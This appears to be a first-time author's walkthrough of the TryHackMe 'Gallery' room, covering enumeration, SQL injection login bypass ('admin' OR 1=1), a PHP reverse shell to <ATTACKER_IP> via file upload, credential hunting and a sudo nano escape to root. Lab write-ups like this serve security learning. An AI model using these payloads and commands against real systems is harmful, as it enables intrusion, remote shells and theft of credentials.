# [THM] Gallery — Write-up

## 🎯 Room Overview

* **Target:** `gallery.thm`
* **Difficulty:** Easy / Medium
* **Objective:** Enumerate active web endpoints, exploit a Time-Based Blind SQL Injection to bypass authentication, leverage unvalidated file uploads for initial access, and abuse misconfigured sudo permissions via GTFOBins.
* **Skills Covered:** Web Enumeration (`ffuf`), Blind SQL Injection, Arbitrary File Upload, Credential Hunting, SUID Execution via Text Editors (`nano`).

---

## 🔍 Phase 1: Enumeration & Reconnaissance

### Initial Web Reconnaissance
Kicking things off with an Nmap scan to identify open ports on the target machine. 

```bash
nmap -p- -sS -sC -sV -O -T4 --min-rate 500 gallery.thm -oN full_scan.txt -vv

```

The results reveal three open ports: port 22 running SSH, and ports 80 and 8080 both running HTTP. With two web ports available, port 8080 is the most interesting candidate for where the website is being hosted, so that's where we'll point our attention first.

Navigating to port 8080 in the browser, we are greeted with a login page — this is our starting point and the first thing we'll need to get past to move further into the target.

### Source Code Analysis & Directory Fuzzing

While analyzing the page source, something interesting stands out: a forgot password feature that has been commented out and left unimplemented. However, the path it references in the code may still be active on the server, which is worth keeping in mind for later.

Before going down that route, running `ffuf` to enumerate any hidden directories and endpoints will give us a broader picture of what the target has to offer.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u [http://gallery.thm:8080/FUZZ](http://gallery.thm:8080/FUZZ) -e .php,.txt -v

```

Discovering a directory called `uploads` opens up an interesting lead. Accessing it reveals a folder named `user1`, which could potentially be a valid username for an account on the website — something worth holding onto as we look for a way into the login page.

---

## 🗺️ Phase 2: Vulnerability Analysis & Dead Ends

The other directories do not seem to have anything special to explore, so I have two ideas:

1. **Brute-force** the login with Hydra and the `rockyou.txt` wordlist to find the password for the user `user_1`.
2. **Intercept** the request made to the login page and uncomment the password recovery content.

I am going to test brute-forcing first.

```bash
hydra -l user_1 -P /usr/share/wordlists/rockyou.txt gallery.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

```

The brute force attempt doesn't appear to be yielding any results — it's possible that `user_1` doesn't actually exist in the system.

### Inspecting Responses with Burp Suite

Since Hydra was generating false positives, I decided to inspect the response in Burp Suite and that's where things got interesting. In the response, I discovered what is likely our entry point into the target.

The response revealed that a SQL query is being executed against a table to validate credentials. Specifically, it converts the submitted password into an MD5 hash and checks whether that hash, paired with the given username, exists in the database.

With this information confirmed, we now have a clear path forward — it's time to test for SQL injection.

---

## 🔓 Phase 3: Initial Access Vector

### Automated SQL Injection (`sqlmap`)

To test for SQL injection, the easiest and fastest approach is to use the well-known tool `sqlmap`. To do this, we first need to capture the POST request sent after submitting some credentials using Burp Suite, then save that request to a file (`request.txt`).

> **Why capture the full POST request?**
> Unlike a GET request where data is visible in the URL, login credentials and form data are hidden within the HTTP Request Body. By saving the full request to a file, we provide `sqlmap` with all the necessary context including HTTP Headers, Cookies, and the exact structure of the POST data — allowing the tool to know precisely where to inject its test payloads.

With the file ready, we can run `sqlmap` against it:

```bash
sqlmap -r request.txt --batch --dbs

```

While `sqlmap` is running, we can see the results confirm the initial suspicion: the server is vulnerable to **Time-Based Blind SQL Injection**.

> **Technical Note:** This technique works by sending a query that forces the database to pause using a `SLEEP` command if a specific condition is true. By measuring how long the server takes to respond, an attacker can gradually infer data from the database even when the page returns no visible errors or query results, making it a particularly stealthy and effective exploitation method. It is gonna take a while until we dump all the data...

Because this technique requires testing character by character, the process can be quite slow. To speed things up, we can pass additional arguments to `sqlmap` instructing it to identify the current database and enumerate its tables. This way, as `sqlmap` discovers them, it reports the database name and table names in real time, giving us a clearer picture of the target's structure as the attack progresses.

```bash
sqlmap -r request.txt --batch -D gallery_db --tables

```

### Manual Authentication Bypass

With `sqlmap` taking too long, I decided to take a step back and manually test a simple SQL injection payload directly on the login page fields, and it worked!

* **Payload:** `admin' OR 1=1-- -`

We now have authenticated access with administrator permissions.

### Exploiting Arbitrary File Upload to RCE

Navigating to the albums section, there's a file upload functionality — a perfect opportunity to attempt uploading a reverse shell.

1. **First Attempt:** The first approach was to disguise the shell payload as a standard image file (e.g., `shell.jpg`), but the server wasn't fooled and it didn't execute.
2. **Second Attempt:** Switching tactics, the file was uploaded directly as a native PHP file instead (`shell.php`), and this time it bypassed verification entirely.

```php
<?php
// Simple PHP Reverse Shell
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'");
?>

```

After starting a local netcat listener (`nc -lvnp 4444`) and triggering the uploaded file path, we successfully establish a connection. **We have a reverse shell.**

---

## 🕵️ Phase 4: Internal Enumeration & Pivoting

Navigating to the home directory reveals the target user: `mike`. Now we need to find their password, and to do that we'll have to go directly to the source — the database we know is running on the server. By connecting to it locally, we can dig through its contents and hopefully extract the credentials we need.

### Investigation of Configuration Files

Before diving into the database directly, I decided to investigate the configuration files first. Sure enough, within one of them it's possible to see which files are being used to establish the database connection and the one that stands out is the initialization file. Let's take a closer look at it and see what useful information we can pull from it.

And just like that, we have the database credentials. The initialization file handed us everything we needed to authenticate and move forward into the database.

### Hash Cracking (Dead Ends)

So the next step is to attempt cracking the recovered database hash and then switch over to Mike's account using the credentials. To identify the hash type and determine the correct mode for Hashcat, we use `hashid`.

While John the Ripper tends to be faster in some environments, for simpler hashes like this one Hashcat is the preferred choice.

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

```

After running it, the cracked password turns out to be `admin`. Since the password didn't belong to Mike, the next move is to use it to authenticate directly into the database as the admin user. Logging in with elevated privileges might expose additional information that wasn't visible before, so it's worth digging deeper to see what else the database is hiding.

Unfortunately, that was not working too.

### Hunting in Backups and Bash History

Since nothing was panning out, it was time to take a few steps back and rethink the approach. While exploring the `/var` directory, something catches the eye — a folder called `backups`. This could be exactly the lead we've been looking for, so let's see what's inside.

Inside the backups folder there's a backup file belonging to Mike, and things get even better from there: in the documents folder sits a file containing all of his account credentials. After the long road to get here, we finally have Mike's login details. Using them to switch over to his account and establishing a connection via SSH gives us a much more stable and reliable shell to work from.

However, with none of those static document passwords working for Mike, it was time to dig even deeper. Going through the `.bash_history` file reveals exactly what we needed: Mike's actual password had been used in a previous manual command and left behind in the history log, exposing his active credentials without any cracking required!

Finally, after all that persistence and digging, we are in as Mike via SSH and the user flag is ours! A hard-earned win that took plenty of twists and turns along the way.

---

## 🚀 Phase 5: Privilege Escalation to Root

Now it's time to go after root. Starting with the basics, running `sudo -l` to check what binary operational privileges Mike has immediately points us in the right direction.

```bash
mike@gallery:~$ sudo -l

```

As it turns out, Mike has sudo permissions over a specific file running as root called `rootki`, giving us a clear and direct path to privilege escalation.

Reading through the `rootki` file script, it becomes clear how the privilege escalation will work. The script invokes `nano`, and nano is well known for its ability to execute commands from within the editor interface itself. By exploiting this behavior, we can break out of the editor and spawn a shell running as root.

### GTFOBins Exploitation Strategy

Heading over to **GTFOBins**, the go-to resource for finding Unix binary exploitation techniques, we get exactly what we need. The site documents precisely how `nano` can be abused to escape the editor and execute arbitrary system commands.

```text
Sudo Privilege Escalation via Nano:
1. Run the allowed command with sudo.
2. Inside nano, press Ctrl+R then Ctrl+X.
3. Type the command payload to spawn a shell.

```

So with the file executing and the read option selected:

1. Pressing `Ctrl + R` opens nano's built-in read command prompt.
2. Pressing `Ctrl + X` advances into the command execution interface.
3. Pasting in the execution line found on GTFOBins triggers the exploit:

```text
reset; sh 1>&0 2>&0

```

Pressing `Enter` triggers nano to execute the pasted command sequence, and just like that, the editor breaks context and a shell spawns with root privileges!

```text
whoami
root
cat /root/root.txt

```

The machine is fully compromised and the root flag is captured!

---

## 📝 Conclusion & Key Takeaways

The Gallery machine on TryHackMe proved to be a fantastic learning experience from start to finish. What began as a simple login page turned into a journey that touched on a wide range of red team methodologies:

* **Web Enumeration & Flaw Identification:** Spotting commented code clues and hunting hidden resources via fuzzing tools.
* **SQL Injection & DB Analysis:** Bypassing entry controls and understanding Time-Based blind inferencing layout constraints.
* **Arbitrary File Upload:** Testing validation bypass rules to secure unauthenticated Remote Code Execution.
* **Post-Exploitation Persistence:** Hunting environment configurations, reading system execution history, and abusing text-editor binaries via GTFOBins.

The box had plenty of twists along the way, with several rabbit holes that required stepping back and rethinking the approach, which honestly makes it a great machine for building the kind of methodology and patience that CTFs demand.

If you made it this far, thank you for reading and I hope it was helpful or at the very least an enjoyable walkthrough to follow along with. As mentioned at the start, this is my first write-up so any feedback or suggestions are truly appreciated — they will go a long way in helping me grow and improve for the next one!

```

```
